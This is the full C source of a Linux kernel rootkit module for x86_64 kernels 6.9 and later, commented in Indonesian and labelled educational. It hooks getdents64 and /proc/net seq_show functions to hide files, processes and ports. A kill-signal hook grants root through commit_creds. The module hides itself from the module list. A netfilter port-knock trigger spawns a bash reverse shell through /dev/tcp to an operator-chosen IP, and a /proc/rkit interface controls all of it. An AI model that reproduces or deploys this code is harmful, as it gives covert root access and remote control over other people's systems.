/*
 * rkit6x.c — backend newest_6x: kernel >=6.9 && <7.0 (x86_64)
 *
 * File tunggal, teknik identik modern_5x_6x (dipisah agar guard & uji
 * per-era independen). Fitur v1+v2:
 *   - hide file by nama, hide PID, hide KONEKSI (port) via /proc/rkit
 *   - LPE: kill -s 63
 *   - self-hide modul: modhide/modshow (modshow SEBELUM rmmod)
 *   - backdoor port-knock OPT-IN: backdoor_ip=<ip> saat insmod
 *   - kontrol runtime /proc/rkit
 *
 * Status: 🚧 BELUM DIUJI — wajib docs/TESTING.md (console VM).
 */
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/stddef.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/printk.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/rculist.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/net_namespace.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/jiffies.h>
#include <linux/workqueue.h>
#include <linux/kmod.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(6,9,0)
#error "backend newest_6x hanya untuk kernel >=6.9 (termasuk jalur 7.x EKSPERIMENTAL)"
#endif
#if !defined(CONFIG_X86_64)
#error "backend newest_6x hanya untuk x86_64"
#endif

#define K6_LPE_SIG   63
#define K6_MAX_HIDE  32
#define K6_NAME_LEN  64
#define K6_MAX_PORT  64

/* ================= parameter ================= */
static char *hide, *hidepid, *hideport;
static char *backdoor_ip;
static unsigned int backdoor_port = 4444;
static unsigned int knock_port = 1337;
module_param(hide,       charp, 0000);
module_param(hidepid,    charp, 0000);
module_param(hideport,   charp, 0000);
module_param(backdoor_ip,   charp, 0000);
module_param(backdoor_port, uint,  0000);
module_param(knock_port,    uint,  0000);

/* ================= daftar ================= */
static char g_names[K6_MAX_HIDE][K6_NAME_LEN];
static u32  g_pids[K6_MAX_HIDE];
static u16  g_ports[K6_MAX_PORT];
static int  g_nnames, g_npids, g_nports;

static void list_init_from_params(void)
{
	char *buf, *tok, *save;

	if (hide) {
		buf = kstrdup(hide, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_nnames < K6_MAX_HIDE;
			     tok = strsep(&buf, ",")) {
				if (tok[0]) {
					snprintf(g_names[g_nnames], K6_NAME_LEN, "%s", tok);
					g_nnames++;
				}
			}
			kfree(buf);
		}
	}
	if (hidepid) {
		buf = kstrdup(hidepid, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_npids < K6_MAX_HIDE;
			     tok = strsep(&buf, ",")) {
				if (tok[0]) {
					g_pids[g_npids] = simple_strtoul(tok, &save, 10);
					if (g_pids[g_npids])
						g_npids++;
				}
			}
			kfree(buf);
		}
	}
	if (hideport) {
		buf = kstrdup(hideport, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_nports < K6_MAX_PORT;
			     tok = strsep(&buf, ",")) {
				unsigned long p = simple_strtoul(tok, &save, 10);

				if (p && p <= 65535)
					g_ports[g_nports++] = (u16)p;
			}
			kfree(buf);
		}
	}
}

static bool is_hidden_name(const char *n)
{
	int i;

	for (i = 0; i < g_nnames; i++)
		if (!strcmp(g_names[i], n))
			return true;
	return false;
}

static bool is_hidden_pid(const char *n)
{
	u32 pid;
	int i, l;

	if (!n || !n[0] || !isdigit(n[0]))
		return false;
	l = strnlen(n, K6_NAME_LEN);
	for (i = 0; i < l; i++)
		if (!isdigit(n[i]))
			return false;
	pid = simple_strtoul(n, NULL, 10);
	for (i = 0; i < g_npids; i++)
		if (g_pids[i] == pid)
			return true;
	return false;
}

static bool is_hidden_port(u16 p)
{
	int i;

	for (i = 0; i < g_nports; i++)
		if (g_ports[i] == p)
			return true;
	return false;
}

static bool any_ports(void)
{
	return g_nports > 0;
}

static int list_add_name(const char *n)
{
	if (!n || !n[0] || strlen(n) >= K6_NAME_LEN)
		return -EINVAL;
	if (is_hidden_name(n))
		return 0;
	if (g_nnames >= K6_MAX_HIDE)
		return -ENOSPC;
	snprintf(g_names[g_nnames], K6_NAME_LEN, "%s", n);
	g_nnames++;
	return 0;
}

static int list_del_name(const char *n)
{
	int i;

	for (i = 0; i < g_nnames; i++) {
		if (!strcmp(g_names[i], n)) {
			memmove(&g_names[i], &g_names[i + 1],
				(g_nnames - i - 1) * K6_NAME_LEN);
			g_nnames--;
			return 0;
		}
	}
	return -ENOENT;
}

static int list_add_pid(u32 p)
{
	int i;

	if (!p)
		return -EINVAL;
	for (i = 0; i < g_npids; i++)
		if (g_pids[i] == p)
			return 0;
	if (g_npids >= K6_MAX_HIDE)
		return -ENOSPC;
	g_pids[g_npids++] = p;
	return 0;
}

static int list_del_pid(u32 p)
{
	int i;

	for (i = 0; i < g_npids; i++) {
		if (g_pids[i] == p) {
			memmove(&g_pids[i], &g_pids[i + 1],
				(g_npids - i - 1) * sizeof(u32));
			g_npids--;
			return 0;
		}
	}
	return -ENOENT;
}

static int list_add_port(u16 p)
{
	int i;

	if (!p)
		return -EINVAL;
	for (i = 0; i < g_nports; i++)
		if (g_ports[i] == p)
			return 0;
	if (g_nports >= K6_MAX_PORT)
		return -ENOSPC;
	g_ports[g_nports++] = p;
	return 0;
}

static int list_del_port(u16 p)
{
	int i;

	for (i = 0; i < g_nports; i++) {
		if (g_ports[i] == p) {
			memmove(&g_ports[i], &g_ports[i + 1],
				(g_nports - i - 1) * sizeof(u16));
			g_nports--;
			return 0;
		}
	}
	return -ENOENT;
}

/* ================= resolver (kprobe -> kallsyms_on_each_symbol) ================= */
typedef int (*k6_cb_t)(void *, const char *, struct module *, unsigned long);
typedef int (*k6_iter_t)(k6_cb_t, void *);
static k6_iter_t g_iter;

struct k6_lk { const char *name; unsigned long addr; };

static int k6_cb(void *d, const char *nm, struct module *m, unsigned long a)
{
	struct k6_lk *l = d;

	(void)m;
	if (!strcmp(l->name, nm)) {
		l->addr = a;
		return 1;
	}
	return 0;
}

static unsigned long k6_lookup(const char *sym)
{
	struct k6_lk l = { .name = sym, .addr = 0 };

	if (!g_iter)
		return 0;
	g_iter(k6_cb, &l);
	return l.addr;
}

/* ================= hook getdents64 (hide file & PID) ================= */
struct __attribute__((packed)) k6_dirent {
	u64 ino; u64 off; unsigned short reclen; unsigned char type; char name[];
};
#define NAME_OFF offsetof(struct k6_dirent, name)

struct gd_save { char __user *buf; };

static bool blocked(const char *n, unsigned int max)
{
	unsigned int i, l;

	if (!n || !max)
		return false;
	l = strnlen(n, max);
	if (!l)
		return false;
	if (is_hidden_name(n))
		return true;
	for (i = 0; i < l; i++)
		if (!isdigit(n[i]))
			return false;
	return is_hidden_pid(n);
}

static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	/*
	 * PERBAIKAN BUG EKSTRAKSI (bug identik ditemukan di backend modern,
	 * terbukti lewat uji 5.11): __x64_sys_getdents64 adalah WRAPPER yang
	 * menerima const struct pt_regs * — argumen syscall asli ada di DALAM
	 * struct itu (regs->di = pt_regs* -> ->si = buffer user).
	 * Kode lama memakai regs->si LANGSUNG = register sampah ->
	 * copy_from_user EFAULT diam-diam -> filter TIDAK PERNAH jalan.
	 * Pola sama dengan hook kill di file ini (sr = regs->di) yang LULUS uji.
	 */
	struct pt_regs *sregs = (struct pt_regs *)regs->di;

	((struct gd_save *)ri->data)->buf =
		sregs ? (char __user *)sregs->si : NULL;
	return 0;
}

static int gd_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gd_save *s = (struct gd_save *)ri->data;
	long ret = regs_return_value(regs);
	unsigned long pos = 0, out = 0;
	char *kb;

	if (!s->buf || ret <= 0 || ret > (1L << 24))   /* buf NULL = ekstraksi gagal */
		return 0;
	kb = kmalloc((size_t)ret, GFP_KERNEL);
	if (!kb)
		return 0;
	if (copy_from_user(kb, s->buf, (unsigned long)ret)) {
		kfree(kb);
		return 0;
	}
	while (pos + NAME_OFF < (unsigned long)ret) {
		struct k6_dirent *d = (void *)(kb + pos);
		unsigned int r = d->reclen;

		if (r < NAME_OFF + 1 || pos + r > (unsigned long)ret)
			break;
		if (!blocked(d->name, r - NAME_OFF)) {
			if (out != pos)
				memmove(kb + out, d, r);
			out += r;
		}
		pos += r;
	}
	if (out != (unsigned long)ret && copy_to_user(s->buf, kb, out) == 0)
		regs->ax = out;
	kfree(kb);
	return 0;
}

static struct kretprobe rp_gd;

/* ================= hook conn (hide port di /proc/net tcp+udp) ================= */
static bool hex4(const char *p, const char *end, unsigned int *out)
{
	unsigned int v = 0;
	int i;

	if (p + 4 > end)
		return false;
	for (i = 0; i < 4; i++) {
		char c = p[i];

		v <<= 4;
		if (c >= '0' && c <= '9')
			v |= c - '0';
		else if (c >= 'a' && c <= 'f')
			v |= c - 'a' + 10;
		else if (c >= 'A' && c <= 'F')
			v |= c - 'A' + 10;
		else
			return false;
	}
	*out = v;
	return true;
}

static const char *next_colon(const char *p, const char *end)
{
	while (p < end && *p != ':')
		p++;
	return p < end ? p : NULL;
}

struct seq_save { struct seq_file *m; };

static int seq_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	((struct seq_save *)ri->data)->m = (struct seq_file *)regs->di;
	return 0;
}

static int seq_post(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct seq_save *s = (struct seq_save *)ri->data;
	char *buf, *row, *end;
	const char *c1, *c2, *c3;
	unsigned int port;

	(void)regs;
	if (!s->m || !s->m->buf || !s->m->count || !any_ports())
		return 0;
	buf = s->m->buf;
	end = buf + s->m->count;

	/*
	 * PERBAIKAN BUG EKSTRAKSI-BARIS (bug identik di legacy & modern,
	 * terbukti lewat uji lapangan): seq_read MENUMPUK banyak baris dalam
	 * satu buffer — yang baru ditulis show() = baris TERAKHIR.
	 * Proses hanya baris terakhir (dari '\n' sebelumnya); kalau cocok
	 * buang baris ITU saja. Kode lama parse dari awal buffer (selalu
	 * port baris pertama -> baris ke-N tak pernah cocok) + count=0
	 * (menghapus semua baris lain).
	 */
	if (end[-1] != '\n')
		return 0;              /* belum utuh (overflow) — biarkan kernel */
	row = end - 1;
	while (row > buf && row[-1] != '\n')
		row--;                 /* mundur ke awal baris terakhir */

	c1 = next_colon(row, end);
	if (!c1)
		return 0;
	c2 = next_colon(c1 + 1, end);
	if (!c2 || !hex4(c2 + 1, end, &port))
		return 0;
	if (port <= 0xffff && is_hidden_port((u16)port)) {
		s->m->count = row - buf;   /* buang hanya baris ini */
		return 0;
	}
	c3 = next_colon(c2 + 1, end);
	if (c3 && hex4(c3 + 1, end, &port) &&
	    port <= 0xffff && is_hidden_port((u16)port))
		s->m->count = row - buf;
	return 0;
}

static struct kretprobe rp_seq[4];
static const char *const rp_seq_syms[4] = {
	"tcp4_seq_show", "tcp6_seq_show",
	"udp4_seq_show", "udp6_seq_show",
};

/* ================= hook kill (LPE) ================= */
typedef struct task_struct *(*k6_pkc_t)(struct task_struct *);
typedef void (*k6_cc_t)(struct task_struct *);

static int kill_pre(struct kprobe *kp, struct pt_regs *regs)
{
	struct pt_regs *sr = (struct pt_regs *)regs->di;

	(void)kp;
	if (!sr)
		return 0;
	if ((int)sr->si == K6_LPE_SIG) {
		static k6_pkc_t f_pkc;
		static k6_cc_t  f_cc;

		if (!f_pkc || !f_cc) {
			f_pkc = (k6_pkc_t)k6_lookup("prepare_kernel_cred");
			f_cc  = (k6_cc_t)k6_lookup("commit_creds");
		}
		if (f_pkc && f_cc) {
			f_cc(f_pkc(NULL));
			sr->si = 0;                 /* netralkan: kill(pid,0) */
			pr_info("k6: root diberikan ke pid %d\n", (int)current->pid);
		}
	}
	return 0;
}

static struct kprobe kp_kill = {
	.pre_handler = kill_pre,
	.symbol_name = "__x64_sys_kill",
};

/* ================= self-hide modul ================= */
static struct list_head *g_modules;
static struct mutex *g_module_mutex;
static bool g_hidden;

static int modhide_init(void)
{
	g_modules = (struct list_head *)k6_lookup("modules");
	g_module_mutex = (struct mutex *)k6_lookup("module_mutex");
	if (!g_modules || !g_module_mutex) {
		pr_warn("k6: symbol modules/module_mutex tak ditemukan — self-hide nonaktif\n");
		g_modules = NULL;
		g_module_mutex = NULL;
		return -ENOENT;
	}
	return 0;
}

static int modhide_hide(void)
{
	if (g_hidden)
		return 0;
	if (!g_module_mutex)
		return -EOPNOTSUPP;
	mutex_lock(g_module_mutex);
	list_del_rcu(&THIS_MODULE->list);
	mutex_unlock(g_module_mutex);
	g_hidden = true;
	pr_info("k6: modul disembunyikan (modshow sebelum rmmod!)\n");
	return 0;
}

static int modhide_show(void)
{
	if (!g_hidden)
		return 0;
	if (!g_module_mutex || !g_modules)
		return -EOPNOTSUPP;
	mutex_lock(g_module_mutex);
	list_add_rcu(&THIS_MODULE->list, g_modules);
	mutex_unlock(g_module_mutex);
	g_hidden = false;
	pr_info("k6: modul dikembalikan (siap rmmod)\n");
	return 0;
}

/* ================= backdoor port-knock (opt-in) ================= */
static struct work_struct g_fire_ws;
static unsigned long g_last_fire;
static bool g_hook_registered;

static void fire_worker(struct work_struct *ws)
{
	char cmd[160];
	char *argv[4];
	char *envp[] = { "HOME=/", "PATH=/usr/bin:/bin", NULL };

	(void)ws;
	if (!backdoor_ip || !backdoor_ip[0])
		return;
	snprintf(cmd, sizeof(cmd), "bash -i >& /dev/tcp/%s/%u 0>&1",
		 backdoor_ip, backdoor_port);
	argv[0] = "/bin/bash";
	argv[1] = "-c";
	argv[2] = cmd;
	argv[3] = NULL;
	if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC))
		pr_warn("k6: backdoor gagal dijalankan\n");
	else
		pr_info("k6: backdoor dipecat ke %s:%u\n", backdoor_ip, backdoor_port);
}

static unsigned int knock_hook(void *priv, struct sk_buff *skb,
			       const struct nf_hook_state *state)
{
	struct iphdr *iph;
	struct tcphdr *th;

	(void)priv;
	(void)state;
	if (!backdoor_ip || !backdoor_ip[0])
		return NF_ACCEPT;
	if (!pskb_may_pull(skb, sizeof(struct iphdr) + sizeof(struct tcphdr)))
		return NF_ACCEPT;
	iph = ip_hdr(skb);
	if (iph->protocol != IPPROTO_TCP)
		return NF_ACCEPT;
	th = (struct tcphdr *)((char *)iph + iph->ihl * 4);
	if (!th->syn || th->ack)
		return NF_ACCEPT;
	if (ntohs(th->dest) != knock_port)
		return NF_ACCEPT;
	if (time_before(jiffies, g_last_fire + 5 * HZ))
		return NF_ACCEPT;
	g_last_fire = jiffies;
	schedule_work(&g_fire_ws);
	return NF_ACCEPT;
}

static struct nf_hook_ops g_ops = {
	.hook     = knock_hook,
	.pf       = AF_INET,
	.hooknum  = NF_INET_LOCAL_IN,
	.priority = NF_IP_PRI_FIRST,
};

static int backdoor_init(void)
{
	int ret;

	INIT_WORK(&g_fire_ws, fire_worker);
	if (!backdoor_ip || !backdoor_ip[0])
		return 0;
	ret = nf_register_net_hook(&init_net, &g_ops);
	if (ret) {
		pr_warn("k6: backdoor nf hook gagal (%d)\n", ret);
		return ret;
	}
	g_hook_registered = true;
	pr_info("k6: backdoor AKTIF — knock TCP %u -> %s:%u\n",
		knock_port, backdoor_ip, backdoor_port);
	return 0;
}

static void backdoor_exit(void)
{
	if (g_hook_registered) {
		nf_unregister_net_hook(&init_net, &g_ops);
		g_hook_registered = false;
	}
	cancel_work_sync(&g_fire_ws);
}

/* ================= status ================= */
static int list_status(char *b, size_t sz)
{
	int i, off = 0;

	off += scnprintf(b + off, sz - off, "backend: newest_6x\n");
	off += scnprintf(b + off, sz - off, "hide_names(%d):", g_nnames);
	for (i = 0; i < g_nnames && off < (int)sz - K6_NAME_LEN - 2; i++)
		off += scnprintf(b + off, sz - off, "%s%s", i ? "," : " ", g_names[i]);
	off += scnprintf(b + off, sz - off, "\nhide_pids(%d):", g_npids);
	for (i = 0; i < g_npids && off < (int)sz - 16; i++)
		off += scnprintf(b + off, sz - off, "%s%u", i ? "," : " ", g_pids[i]);
	off += scnprintf(b + off, sz - off, "\nhide_ports(%d):", g_nports);
	for (i = 0; i < g_nports && off < (int)sz - 8; i++)
		off += scnprintf(b + off, sz - off, "%s%u", i ? "," : " ", g_ports[i]);
	off += scnprintf(b + off, sz - off, "\nmod_hide: %s\n",
			 g_hidden ? "aktif" : "tidak");
	scnprintf(b + off, sz - off, "backdoor: %s\n",
		  (!backdoor_ip || !backdoor_ip[0]) ? "nonaktif (backdoor_ip kosong)" :
		  g_hook_registered ? "aktif" : "gagal daftar hook");
	return off;
}

/* ================= kontrol /proc/rkit ================= */
static struct proc_dir_entry *g_proc;
static char g_stat[768];

static ssize_t k6_read(struct file *f, char __user *u, size_t c, loff_t *p)
{
	(void)f;
	list_status(g_stat, sizeof(g_stat));
	return simple_read_from_buffer(u, c, p, g_stat, strlen(g_stat));
}

static ssize_t k6_write(struct file *f, const char __user *u, size_t c, loff_t *p)
{
	char kb[128], *cmd, *arg;
	size_t n = c < sizeof(kb) - 1 ? c : sizeof(kb) - 1;
	int ret = 0;
	unsigned long pv;

	(void)f; (void)p;
	if (copy_from_user(kb, u, n))
		return -EFAULT;
	kb[n] = '\0';
	if (n && kb[n - 1] == '\n')
		kb[n - 1] = '\0';
	cmd = kb;
	while (*cmd == ' ')
		cmd++;
	arg = strchr(cmd, ' ');
	if (arg) { *arg++ = '\0'; while (*arg == ' ') arg++; }
	else arg = "";

	if (!strcmp(cmd, "hide"))        ret = list_add_name(arg);
	else if (!strcmp(cmd, "unhide")) ret = list_del_name(arg);
	else if (!strcmp(cmd, "hidepid")   && arg[0]) ret = list_add_pid(simple_strtoul(arg, NULL, 10));
	else if (!strcmp(cmd, "unhidepid") && arg[0]) ret = list_del_pid(simple_strtoul(arg, NULL, 10));
	else if (!strcmp(cmd, "hideport") && arg[0]) {
		pv = simple_strtoul(arg, NULL, 10);
		ret = (pv && pv <= 65535) ? list_add_port((u16)pv) : -EINVAL;
	} else if (!strcmp(cmd, "unhideport") && arg[0]) {
		pv = simple_strtoul(arg, NULL, 10);
		ret = (pv && pv <= 65535) ? list_del_port((u16)pv) : -EINVAL;
	} else if (!strcmp(cmd, "modhide")) ret = modhide_hide();
	else if (!strcmp(cmd, "modshow"))   ret = modhide_show();
	else ret = -EINVAL;
	return ret ? ret : (ssize_t)c;
}

static const struct proc_ops k6_ops = {
	.proc_read  = k6_read,
	.proc_write = k6_write,
	.proc_lseek = default_llseek,
};

/* ================= lifecycle ================= */
static int __init k6_init(void)
{
	int ret, i, got;
	struct kprobe kp = { .symbol_name = "kallsyms_on_each_symbol" };

	pr_info("k6: memuat backend newest_6x (6.9+)\n");
	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("k6: resolver gagal (%d)\n", ret);
		return ret;
	}
	g_iter = (k6_iter_t)kp.addr;
	unregister_kprobe(&kp);
	if (!g_iter)
		return -ENOENT;

	list_init_from_params();

	memset(&rp_gd, 0, sizeof(rp_gd));
	rp_gd.kp.symbol_name = "__x64_sys_getdents64";
	rp_gd.handler = gd_handler;
	rp_gd.entry_handler = gd_entry;
	rp_gd.data_size = sizeof(struct gd_save);
	rp_gd.maxactive = 32;
	ret = register_kretprobe(&rp_gd);
	if (ret)
		goto err;

	ret = register_kprobe(&kp_kill);
	if (ret) {
		unregister_kretprobe(&rp_gd);
		goto err;
	}

	got = 0;
	for (i = 0; i < 4; i++) {
		memset(&rp_seq[i], 0, sizeof(rp_seq[i]));
		rp_seq[i].kp.symbol_name = rp_seq_syms[i];
		rp_seq[i].handler = seq_post;
		rp_seq[i].entry_handler = seq_entry;
		rp_seq[i].data_size = sizeof(struct seq_save);
		rp_seq[i].maxactive = 16;
		if (register_kretprobe(&rp_seq[i]) == 0)
			got++;
	}
	if (!got)
		pr_warn("k6: conn-hide tidak aktif (0/4 seq_show)\n");

	if (modhide_init())
		pr_warn("k6: self-hide nonaktif\n");
	if (backdoor_init())
		pr_info("k6: backdoor NONAKTIF — set backdoor_ip saat insmod\n");

	g_proc = proc_create("rkit", 0600, NULL, &k6_ops);
	if (!g_proc) {
		ret = -ENOMEM;
		goto err2;
	}
	pr_info("k6: siap — uji di VM (docs/TESTING.md)\n");
	return 0;

err2:
	backdoor_exit();
	for (i = 0; i < 4; i++)
		unregister_kretprobe(&rp_seq[i]);
	unregister_kprobe(&kp_kill);
	unregister_kretprobe(&rp_gd);
err:
	g_iter = NULL;
	return ret;
}

static void __exit k6_exit(void)
{
	int i;

	if (g_hidden)
		modhide_show();
	backdoor_exit();
	for (i = 0; i < 4; i++)
		unregister_kretprobe(&rp_seq[i]);
	unregister_kprobe(&kp_kill);
	unregister_kretprobe(&rp_gd);
	proc_remove(g_proc);
	g_iter = NULL;
	pr_info("k6: dilepas\n");
}

module_init(k6_init);
module_exit(k6_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("unified-rootkit (edukasi)");
MODULE_DESCRIPTION("Backend newest_6x: kernel6.9+ — hide file/pid/koneksi, LPE, backdoor opt-in (edukasi)");
